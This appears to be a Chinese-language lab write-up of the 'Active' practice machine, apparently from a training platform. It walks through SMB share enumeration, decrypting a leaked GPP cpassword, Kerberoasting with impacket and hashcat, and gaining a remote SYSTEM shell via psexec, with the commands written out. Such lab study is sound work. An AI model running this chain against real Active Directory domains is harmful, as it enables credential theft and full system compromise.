# Active

- 練習日期:   2026/03/17
- 考點:       SMB 列舉、GPP (Group Policy Preferences) 密碼外洩、Kerberoasting 攻擊。

## SMB 列舉

1. 使用 `smbclient -L <IP_ADDRESS>` 列舉 SMB 服務的共享資源和權限
2. 使用 `smbmap -H <IP_ADDRESS>` 列舉 SMB 服務的共享資源和權限
3. 使用 `nxc smb <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> --shares` 列舉 SMB 服務的共享資源和權限

發現名為 Replication 的共享資料夾，類似 AD 中的 SYSVOL 備份。

## GPP 密碼外洩

早期 Windows Server 允許管理員透過群組原則喜好設定 (Group Policy Preferences, GPP) 來建立本機使用者或更改密碼，而該密碼會以 AES-256 加密後存在 XML 檔的 cpassword 欄位中。

But, 微軟當年把這把 AES 解密金鑰 (Static Key) 公開在 MSDN 官方文件中，所以任何人都可以輕易解密。

```bash
gpp-decrypt <cpassword的字串>
```

## Kerberoasting 攻擊

1. 使用 `impacket-GetUserSPNs.py -request -dc-ip <IP_ADDRESS> <DOMAIN>/<USERNAME>:<PASSWORD> -save -outputfile GetUserSPNs.out` 列舉 Kerberos 服務的 SPN (Service Principal Name)，並且把對應的 Ticket Granting Service (TGS) 票證存在 GetUserSPNs.out 檔案中。

    簡單來說，這行指令做了幾件事：
    - 向 ldap 詢問所有的帳號，即 Kerberos 服務的 SPN (Service Principal Name)
    - 針對每個帳號，向 KDC (Key Distribution Center) 請求一個 TGS 票證，基於 Kerberos 不會檢查你是否真的有權限存取該服務，返回的 TGS 票證包含了帳號的密碼 hash，並把它們存到 GetUserSPNs.out 檔案中。

2. 使用 `hashcat -m 13100 GetUserSPNs.out -a 0 <wordlist>` 對 GetUserSPNs.out 中的 TGS 票證進行暴力破解，找出對應的服務帳號密碼。

3. 使用 `impacket-psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP_ADDRESS>` 來執行遠端命令，取得系統權限。